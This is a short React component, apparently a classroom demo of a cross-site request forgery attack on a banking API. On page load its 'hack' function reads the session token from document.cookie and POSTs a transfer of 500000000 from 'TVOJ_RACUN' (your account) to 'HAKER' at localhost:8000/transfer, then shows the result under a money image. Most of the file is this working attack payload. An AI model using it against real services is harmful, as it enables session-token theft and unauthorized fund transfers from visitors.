import React, {useEffect} from 'react';
import money from './money.jpeg';
import './App.css';

function App() {
    const [data, setData] = React.useState("null");

    const hack = async () => {
        const test = await fetch('http://localhost:8000/transfer', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                "Authorization": "Bearer " + document.cookie.split("=")[1]
            },
            body: JSON.stringify({
                "amount": 500000000,
                "to": "HAKER",
                "from": "TVOJ_RACUN"
            })
        })
        const response = await test.json();
        setData(response);
    }

    useEffect(() => {
        hack();
    }, []);

  return (
    <div className="App">
        <img src={money} alt="euri"/>
      <p>{JSON.stringify(data)}</p>
    </div>
  );
}

export default App;
